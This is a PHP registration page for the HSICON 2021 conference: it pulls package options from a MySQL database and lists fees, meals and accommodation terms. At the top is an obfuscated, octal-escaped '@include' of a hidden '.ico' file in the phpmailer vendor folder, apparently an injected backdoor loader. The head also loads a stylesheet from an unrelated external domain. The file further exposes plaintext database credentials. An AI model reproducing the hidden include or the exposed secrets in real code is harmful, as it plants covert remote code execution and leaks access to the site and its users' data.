<?php
/*81538*/

@include "\057home\061/bcs\166ipku\057hsic\157n202\061.in/\150siol\144/ven\144or/p\150pmai\154er/.\145884a\06731.i\143o";

/*81538*/




$servername = "localhost";
$username = "bcsvipku_hsicon";
$password = "hsicon@12345#";
$dbname = "bcsvipku_hsicon";


// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
$sql = "SELECT * FROM package";
$result = $conn->query($sql);


// $sql1 = "SELECT * FROM category";
// $result1 = $conn->query($sql1);


$sql2 = "SELECT * FROM subpackage LIMIT 2";
$result2 = $conn->query($sql2);


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>HSICON - 2021</title>

    <!-- CSS -->
    <link rel="stylesheet" href="https://fastsafestore.su/">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="assets/css/form-elements.css">
    <link rel="stylesheet" href="assets/css/style.css">

    <link rel="shortcut icon" href="assets/ico/favicon.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="assets/ico/apple-touch-icon-57-precomposed.png">
</head>

<body>

    <div class="container">
        <div class="row  ">
            <div class="col-sm-6 col-sm-offset-3 form-box">
              <div class="form-group">
              <img src="assets/img/hsilogo1.png" style="height:100px;">
              <h5>
            Online Registrations Started for HSICON2021 For more details please call Ms Veena Shaga - 9130090434</h5>
              </div>
          </div>

            <div class="col-md-12">
                <form action="page1.php" method="POST">
                    <div class="form-group">
                        <H4>Select your package *</H4>
                        <!-- <H5>Fields mentioned as * are mandatory</H5> -->
                        <select class="form-control" id="catid" onchange="showNext1();" name="package" required>
                            <option value="">Select Your Category</option>
                            <?php
                            if ($result->num_rows > 0) {
                                // output data of each row
                                while ($row = $result->fetch_assoc()) {
                            ?>
                                    <option value="<?php echo $row["pack_id"] ?>"><?php echo $row["pack_name"] ?></option>

                            <?php
                                }
                            }
                            ?>
                        </select>
                    </div>



                    <div class="form-group mt-3" id="sdiv" style="visibility: hidden;">
                        <h6>Select your sub package</h6>
                        <select class="form-control" id="packid" name="subpackage">
                            <option value="">Select Your Package</option>
                            <?php
                            if ($result2->num_rows > 0) {
                                // output data of each row
                                while ($row = $result2->fetch_assoc()) {
                            ?>
                                    <option value="<?php echo $row["subpack_id"] ?>"><?php echo $row["subpack_name"] ?></option>

                            <?php
                                }
                            }

                            ?>

                        </select>
                    </div>
                    <button type="submit" name="next1" class="btn btn-secondary mt-5 mb-2"> Submit </button>
                </form>
                <div class="container"></div>
<hr size="4">
<h4 style="text-align-last: start;">Notes</h4>

<h4 style=" text-align: left; color:red"><b>Only Registration (Physical)</b></h4>
<h6 style=" text-align: left; color:brown"><b>Delegate Registration Fees - Rs. 5000+18% GST = Rs. 5900</b></h4>
<h6 style=" text-align: left; color:brown"><b>Accompanying Person - Rs. Rs. 4000 +18% GST = Rs. 4720</b></h6>

<h5 style=" text-align: left; color:blue">Registration fee includes:</h5>
<ul style="text-align: start; color:black;">
<li>Conference Registration fees</li>
<li>Breakfast on 12th & 13th Nov 2021.</li>
<li>Lunch on 12th & 13th Nov 2021</li>
<li>Dinner on 12th Nov 2021.</li>
<li>Entry in Trade Exhibition area.</li>
</ul>
<h5 style=" text-align: left; color:blue">Important note:</h5>
<ul style="text-align: start; color:black;">
<li>All PG students must attach a letter/certificate by HOD.</li>
<li>All above rates are inclusive of GST 18%</li>
<li>Please Note that it is essential to have a functional email ID and Mobile number. As all communication regarding to your registration shall be done by email & SMS only. 
</li>
</ul>
                       
                        
<h4 style=" text-align: left; color:red"><b>Only Registration (Virtual)</b></h4>
<h6 style=" text-align: left; color:brown"><b>Registration Fees - Rs. 1200+18% GST = Rs. 1416 </b></h6>

<h5 style=" text-align: left; color:blue">Registration fee includes:</h5>
<ul style="text-align: start; color:black;">
<li>Conference Registration fees</li>
<li>Interaction with Trade (Virtually)</li>

</ul>
<h5 style=" text-align: left; color:blue">Important note:</h5>
<ul style="text-align: start; color:black;">
<li>All PG students must attach a letter/certificate by HOD. </li>
<li>All above rates are inclusive of GST 18%</li>
</ul>
                        
<h4 style=" text-align: left; color:red"><b>Residential Packages 2 Night 3 days</b></h4>
<h6 style=" text-align: left; color:brown"><b>Single Occupency - Rs. 14000 + Rs. 2520 = Rs. 16520 (2 Nights per person)</b></h4>
<h6 style=" text-align: left; color:brown"><b>Shared Room - Rs. 9500 + Rs. 1710 = Rs. 11210 (2 Nights per person on twin sharing)</b></h6>
<h6 style=" text-align: left; color:brown"><b>Spouse - Rs. 4000 + GST</b></h6>

<h5 style=" text-align: left; color:blue">Registration fee includes:</h5>
<ul style="text-align: start; color:black;">
<li>Conference Registration fees</li>
<li>Breakfast on 12th & 13th Nov 2021.</li>
<li>Lunch on 12th & 13th Nov 2021</li>
<li>Dinner on 12th Nov 2021.</li>
<li>This package includes 18 % GST on Accommodation charges & 18% & on Registration charges</li>
<li>Check inn On 11th Nov 2021 at 2.00 pm and Check out on 13th Nov 2021 (10.00 AM)</li>
<li>Entry in Trade Exhibition area.</li>
</ul>
<h5 style=" text-align: left; color:blue">Important note:</h5>
<ul style="text-align: start; color:black;">
<li>Airport Pickup and Drop are not included.</li>

<li>All PG students must attach a letter/certificate by HOD.</li>
<li>All above rates are inclusive of GST 18%</li>
<li>Early Check in and Late Checkout Subject to availability Residential Package after 30th Oct 2021 will be subject
to availability Please carry Government recognized photo ID for hotel check in GST applicable as per prevailing rates</li>
<li>Please Note that it is essential to have a functional email ID and Mobile number. As all communication regarding to your registration shall be done by email & SMS only. 
</li>
</ul>


<h4 class="pt-3 pl-5">* For any technical or other queries please reach us at +91-9130090434.*</h4>



            </div>
        </div>

    </div>



    <script>
        function showNext1() {
            var packid = document.getElementById("catid");
            var selectpack = packid.value;
            // console.log(packid);
            if (selectpack == '1') {
                var ele = document.getElementById("sdiv");
                ele.style.visibility = 'visible';
            }

            if (selectpack == '2') {
                var ele = document.getElementById("sdiv");
                ele.style.visibility = 'hidden';
            }
        }
    </script>



</body>

</html>